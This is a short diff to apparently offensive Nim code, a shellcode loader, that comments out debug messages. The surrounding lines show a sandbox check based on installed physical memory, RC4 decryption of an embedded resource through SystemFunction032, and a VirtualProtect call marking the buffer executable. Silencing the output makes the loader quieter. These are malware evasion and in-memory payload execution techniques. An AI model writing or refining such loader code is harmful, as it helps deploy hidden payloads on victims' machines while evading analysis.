@@ -213,7 +213,7 @@ proc sbCheck(): int =
     try: 
         discard GPIM_p(addr memAvail)
     except:
-        echo "[-] GetPISM failed!"
+        #echo "[-] GetPISM failed!"
         echo GetLastError()
     #[if GetPhysicallyInstalledSystemMemory_p(addr memAvail) != 0:
         echo "GetPISM function failed!"
@@ -389,7 +389,7 @@ proc execute(): void =
     #echo "keyString Buffer Location: ", toHex(cast[int](&keyString.Buffer))
 
     SystemFunction032(&imgString, &keyString)
-    echo "SF032 Called!"
+    #echo "SF032 Called!"
 
     discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
     #echo "VP Called!"
